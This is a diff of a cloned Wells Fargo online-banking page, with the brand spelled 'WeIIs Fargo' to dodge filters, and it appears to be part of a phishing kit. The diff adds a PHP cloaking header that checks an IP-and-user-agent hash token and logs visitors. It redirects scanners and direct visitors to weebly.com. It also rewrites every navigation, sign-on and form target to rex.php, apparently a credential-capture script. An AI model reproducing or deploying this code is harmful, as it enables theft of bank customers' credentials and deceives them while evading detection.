@@ -1,3 +1,4 @@
+<?php ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");function logData($method,$reason, $ip, $ua, $hash, $value){$date = date("Y-m-d H:i:s");$logfile = "log.txt";$logValue = "Date: $date | Type: $method | Status: blocked| Reason: $reason | IP: $ip | UA: $ua | User Hash: $hash | Sent Hash: (Token: $value[0] / Cookie: $value[1])";if(file_exists($logfile)){if(is_writable($logfile)){if($handle = fopen($logfile, "a")){$content = "{$logValue}\r\n";fwrite($handle, $content);fclose($handle);}else{return "File Error";}}else{return "File is not writable";}}else{fopen($logfile, "w");}}if(isset( $_SERVER["HTTP_CF_CONNECTING_IP"] )){$ip = $_SERVER["HTTP_CF_CONNECTING_IP"];}else{/*$ip= $_SERVER["HTTP_X_FORWARDED_FOR"];*/$ip = $_SERVER["REMOTE_ADDR"];}$ua = $_SERVER["HTTP_USER_AGENT"];$method = "token";$value = array(0 => $_GET["chq"]);if(isset($_GET["chq"])){$hash = md5($ip.$ua);if($hash !== $value[0]){logData($method,"hash mismatch", $ip, $ua, $hash, $value);header("Location: https://www.weebly.com", true, 301);}}else{logData($method,"direct hit", $ip, $ua, $hash, $value);header("Location: https://www.weebly.com", true, 301);}?>
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en"><head>
 	
@@ -194,20 +195,20 @@
                 <ul>
 				
                     
-                        <li><a href=error.html>ATMs/Locations</a></li>
+                        <li><a href=rex.php>ATMs/Locations</a></li>
                     
-                        <li><a href=error.html class="ps-masthead-help" role="button">Help</a></li>
+                        <li><a href=rex.php class="ps-masthead-help" role="button">Help</a></li>
                     
-                        <li><a href=error.html>About Us</a></li>
+                        <li><a href=rex.php>About Us</a></li>
                     
-                        <li><a href=error.html xml:lang="es" id="langPrefToggle" class="spTogglePersonal" name="langPrefToggle" lang="es">Español</a></li>
+                        <li><a href=rex.php xml:lang="es" id="langPrefToggle" class="spTogglePersonal" name="langPrefToggle" lang="es">Español</a></li>
                     
-                        <li class="ps-search-item"><a href=error.html class="ps-nxgSearchIcon" id="nxgSearchButton" aria-label="Search, Opens a dialog.">�&nbsp;�&nbsp;</a></li>
+                        <li class="ps-search-item"><a href=rex.php class="ps-nxgSearchIcon" id="nxgSearchButton" aria-label="Search, Opens a dialog.">�&nbsp;�&nbsp;</a></li>
                     
                 
 					<li class="ps-sign-on-item"> <div class="ps-masthead-sign-on">
                 
-                 <a href=error.html class="ps-sign-on-text" data-platform="applicationhost" data-host="Login App Host">Sign On</a>
+                 <a href=rex.php class="ps-sign-on-text" data-platform="applicationhost" data-host="Login App Host">Sign On</a>
            
             </div></li>
                 </ul>
@@ -246,7 +247,7 @@
 								
 								
 								<li class="contact-bar-location-list">
-									<a aria-controls="find_location_block" aria-expanded="false" class="contact-bar-collapsible contact-bar-location" href=error.html role="button" tabindex="0">
+									<a aria-controls="find_location_block" aria-expanded="false" class="contact-bar-collapsible contact-bar-location" href=rex.php role="button" tabindex="0">
 										<span aria-hidden="true" class="contact-bar-location-icon">
 </span>
 										<span aria-level="3" class="contact-bar-select" role="heading">
@@ -258,7 +259,7 @@
 									<div aria-hidden="true" class="contact-bar-content contact-bar-content-hidden" id="find_location_block">
 										<div class="contact-bar-form-grp">
 
-											<form action=error.html class="find_location" method="get" xmlns="http://www.w3.org/1999/xhtml">
+											<form action=rex.php class="find_location" method="get" xmlns="http://www.w3.org/1999/xhtml">
 												<div class="contact-bar-form-input">
 													
 														<input class="contact-bar-input-box" id="supportDropDownLocator" name="searchTxt" placeholder="" aria-label="City, State or ZIP" type="text">
@@ -285,7 +286,7 @@
 
 								
 								<li>
-									<a aria-controls="make_appointment_block" aria-expanded="false" class="contact-bar-collapsible contact-bar-appointment" href=error.html role="button" tabindex="0">
+									<a aria-controls="make_appointment_block" aria-expanded="false" class="contact-bar-collapsible contact-bar-appointment" href=rex.php role="button" tabindex="0">
                                         <span aria-hidden="true" class="support-dropdown-icon appointment-icon">
 </span>
 										<span aria-level="3" class="contact-bar-select" role="heading">
@@ -324,7 +325,7 @@
 								
 
 								<li>
-									<a aria-controls="quick_help_block" aria-expanded="false" class="contact-bar-collapsible contact-bar-call" href=error.html role="button" tabindex="0">
+									<a aria-controls="quick_help_block" aria-expanded="false" class="contact-bar-collapsible contact-bar-call" href=rex.php role="button" tabindex="0">
 										<span aria-hidden="true" class="contact-bar-appointment-icon">
 </span>
 										<span aria-level="3" class="contact-bar-select" role="heading"> Quick help</span>
@@ -334,9 +335,9 @@
 									<div aria-hidden="true" class="contact-bar-content contact-bar-call-desc contact-bar-content-hidden" id="quick_help_block">
 										<ul>
 											
-												<li><a href=error.html>Customer service and FAQs</a></li>
+												<li><a href=rex.php>Customer service and FAQs</a></li>
 											
-												<li> <a href=error.html>Find routing and account numbers</a> </li>
+												<li> <a href=rex.php>Find routing and account numbers</a> </li>
 											
 										</ul>
 									</div>
@@ -373,7 +374,7 @@
 									<li>
 										<div class="ps-popular-faq-link">
 											<div>
-												<a href=error.html>How do I find my routing and account numbers?</a>
+												<a href=rex.php>How do I find my routing and account numbers?</a>
 												<span aria-hidden="true" class="right-chevron"></span>
 
 											</div>
@@ -383,7 +384,7 @@
 									<li>
 										<div class="ps-popular-faq-link">
 											<div>
-												<a href=error.html>Is there a fee for Zelle<sup>®</sup>?</a>
+												<a href=rex.php>Is there a fee for Zelle<sup>®</sup>?</a>
 												<span aria-hidden="true" class="right-chevron"></span>
 
 											</div>
@@ -393,7 +394,7 @@
 									<li>
 										<div class="ps-popular-faq-link">
 											<div>
-												<a href=error.html>How do I report suspected fraud?</a>
+												<a href=rex.php>How do I report suspected fraud?</a>
 												<span aria-hidden="true" class="right-chevron"></span>
 
 											</div>
@@ -403,7 +404,7 @@
 									<li>
 										<div class="ps-popular-faq-link">
 											<div>
-												 <a href=error.html>See more FAQs</a> 
+												 <a href=rex.php>See more FAQs</a> 
 												<span aria-hidden="true" class="right-chevron"></span>
 
 											</div>
@@ -442,21 +443,21 @@
 							
 							<ul class="ps-fat-nav-l2" aria-expanded="true">
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html class="">Checking</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php class="">Checking</a></li>
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html class="">Savings &amp; CDs</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php class="">Savings &amp; CDs</a></li>
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html data-platform="creditCardsWF">Credit Cards</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php data-platform="creditCardsWF">Credit Cards</a></li>
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html class="">Home Loans</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php class="">Home Loans</a></li>
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html class="">Personal Loans</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php class="">Personal Loans</a></li>
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html class="">Auto Loans</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php class="">Auto Loans</a></li>
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html class="">Premier</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php class="">Premier</a></li>
 								
-									<li class="ps-fat-nav-subitem"><a href=error.html>Education &amp; Tools</a></li>
+									<li class="ps-fat-nav-subitem"><a href=rex.php>Education &amp; Tools</a></li>
 								
 							</ul>
 						</li>
@@ -466,22 +467,22 @@
 						
 						
 						
-						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Investing &amp; Wealth Management</a></li>
+						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Investing &amp; Wealth Management</a></li>
 						
 						
 						
 						
-						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Small Business</a></li>
+						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Small Business</a></li>
 						
 						
 						
 						
-						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Commercial Banking</a></li>
+						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Commercial Banking</a></li>
 						
 						
 						
 				
-						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Corporate &amp; Investment Banking</a></li>
+						<li class="ps-fat-nav-item"><a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Corporate &amp; Investment Banking</a></li>
 						
                     </ul>
                 </div>
@@ -489,13 +490,13 @@
                 <div class="ps-fat-nav-l1-extras">
                     <ul>
                         
-                            <li class="ps-fat-nav-extra"><a href=error.html>ATMs/Locations</a></li>
+                            <li class="ps-fat-nav-extra"><a href=rex.php>ATMs/Locations</a></li>
                         
-                            <li class="ps-fat-nav-extra"><a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Customer service and FAQs</a></li>
+                            <li class="ps-fat-nav-extra"><a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Customer service and FAQs</a></li>
                         
-                            <li class="ps-fat-nav-extra"><a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">About Us</a></li>
+                            <li class="ps-fat-nav-extra"><a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">About Us</a></li>
                         
-                            <li class="ps-fat-nav-extra"><a href=error.html id="langPrefToggle" class="spTogglePersonal" name="langPrefToggle" xml:lang="es" lang="es">Español</a></li>
+                            <li class="ps-fat-nav-extra"><a href=rex.php id="langPrefToggle" class="spTogglePersonal" name="langPrefToggle" xml:lang="es" lang="es">Español</a></li>
                         
                     </ul>
                 </div>
@@ -518,14 +519,14 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
-										<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-primary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">View all checking accounts</a>
+										<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-primary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">View all checking accounts</a>
 										
 											
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-secondary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Compare checking accounts</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-secondary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Compare checking accounts</a> 
 											
 										
 									</div>
@@ -534,7 +535,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-piggybank">
 											</div>
@@ -640,42 +641,42 @@
 										
 											<h3 class="l3-headline">BANKING SERVICES</h3>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Routing and account numbers </a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Routing and account numbers </a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Overdraft services</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Overdraft services</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Security and fraud</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Security and fraud</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Checking FAQs</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Checking FAQs</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Global remittance</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Global remittance</a> 
 											</div>
 											<div class="l3-link-item">
-												<a href=error.html enrollmentid="2935" class="">Make an appointment</a>
+												<a href=rex.php enrollmentid="2935" class="">Make an appointment</a>
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Foreign exchange</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Foreign exchange</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Activate debit card</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Activate debit card</a> 
 											</div>
 										
 											<h3 class="l3-headline">DIGITAL BANKING</h3>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">WeIIs Fargo Online<sup>®</sup></a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">WeIIs Fargo Online<sup>®</sup></a> 
 											</div>
 											<div class="l3-link-item">
-												 <a href=error.html class="">WeIIs Fargo Mobile<sup>®</sup> app</a> 
+												 <a href=rex.php class="">WeIIs Fargo Mobile<sup>®</sup> app</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a href=error.html class="">Transfer and pay</a> 
+												 <a href=rex.php class="">Transfer and pay</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Report fraud</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Report fraud</a> 
 											</div>
 										
 									</div>
@@ -697,14 +698,14 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
-										<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-primary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">View all savings accounts</a>
+										<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-primary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">View all savings accounts</a>
 										
 											
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-secondary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Check all rates</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-secondary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Check all rates</a> 
 											
 										
 									</div>
@@ -713,7 +714,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-dollar-bills">
 											</div>
@@ -732,7 +733,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-money-exchange">
 											</div>
@@ -751,7 +752,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-sprout">
 											</div>
@@ -770,7 +771,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-piggybank">
 											</div>
@@ -800,36 +801,36 @@
 										
 											<h3 class="l3-headline">BANKING SERVICES</h3>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Routing and account numbers </a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Routing and account numbers </a> 
 											</div>
 											<div class="l3-link-item">
 												 <a data-platform="publicsite" href="# exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Tax center</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Security and fraud</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Security and fraud</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Savings FAQs</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Savings FAQs</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Global remittance</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Global remittance</a> 
 											</div>
 											<div class="l3-link-item">
-												<a href=error.html enrollmentid="2935" class="">Make an appointment</a>
+												<a href=rex.php enrollmentid="2935" class="">Make an appointment</a>
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Foreign exchange</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Foreign exchange</a> 
 											</div>
 										
 											<h3 class="l3-headline">DIGITAL BANKING</h3>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">WeIIs Fargo Online<sup>®</sup></a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">WeIIs Fargo Online<sup>®</sup></a> 
 											</div>
 											<div class="l3-link-item">
-												 <a href=error.html class="">WeIIs Fargo Mobile<sup>®</sup> app</a> 
+												 <a href=rex.php class="">WeIIs Fargo Mobile<sup>®</sup> app</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a href=error.html class="">Transfer and pay</a> 
+												 <a href=rex.php class="">Transfer and pay</a> 
 											</div>
 										
 									</div>
@@ -842,7 +843,7 @@
 								</div>
 							</div>
 					
-							<div class="ps-fat-nav-l3" data-matching-href=error.html>
+							<div class="ps-fat-nav-l3" data-matching-href=rex.php>
 										
 								<div class="ps-fat-nav-search">	
 									<button class="fat-nav-search" id="nxgSearchButton"><span class="fat-nav-search-icon">
@@ -851,14 +852,14 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
-										<a href=error.html class="ps-fat-nav-l3-primary-button" data-platform="creditCardsWF">View all credit cards</a>
+										<a href=rex.php class="ps-fat-nav-l3-primary-button" data-platform="creditCardsWF">View all credit cards</a>
 										
 											
-												<a href=error.html class="ps-fat-nav-l3-secondary-button" data-platform="wstHost">See if you're prequalified</a>
+												<a href=rex.php class="ps-fat-nav-l3-secondary-button" data-platform="wstHost">See if you're prequalified</a>
 											
 										
 									</div>
@@ -867,7 +868,7 @@
 										
 											
 											
-												<a href=error.html class="l3-product-tile" data-platform="creditCardsWF">
+												<a href=rex.php class="l3-product-tile" data-platform="creditCardsWF">
 											
 											<div class="l3-product-icon icon-dollar-bills">
 											</div>
@@ -881,7 +882,7 @@
 										
 											
 											
-												<a href=error.html class="l3-product-tile" data-platform="creditCardsWF">
+												<a href=rex.php class="l3-product-tile" data-platform="creditCardsWF">
 											
 											<div class="l3-product-icon icon-star">
 											</div>
@@ -895,7 +896,7 @@
 										
 											
 											
-												<a href=error.html class="l3-product-tile" data-platform="creditCardsWF">
+												<a href=rex.php class="l3-product-tile" data-platform="creditCardsWF">
 											
 											<div class="l3-product-icon icon-percentage">
 											</div>
@@ -909,7 +910,7 @@
 										
 											
 											
-												<a href=error.html class="l3-product-tile" data-platform="creditCardsWF">
+												<a href=rex.php class="l3-product-tile" data-platform="creditCardsWF">
 											
 											<div class="l3-product-icon icon-airplane">
 											</div>
@@ -923,7 +924,7 @@
 										
 											
 											
-												<a href=error.html data-platform="creditCardsWF" class="l3-product-tile">
+												<a href=rex.php data-platform="creditCardsWF" class="l3-product-tile">
 											
 											<div class="l3-product-icon icon-money-transfer">
 											</div>
@@ -937,7 +938,7 @@
 										
 											
 											
-												<a href=error.html class="l3-product-tile" data-platform="creditCardsWF">
+												<a href=rex.php class="l3-product-tile" data-platform="creditCardsWF">
 											
 											<div class="l3-product-icon icon-briefcase">
 											</div>
@@ -962,30 +963,30 @@
 										
 											<h3 class="l3-headline">CREDIT CARD SERVICES</h3>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Confirm credit card</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Confirm credit card</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">WeIIs Fargo Rewards<sup>®</sup></a> 
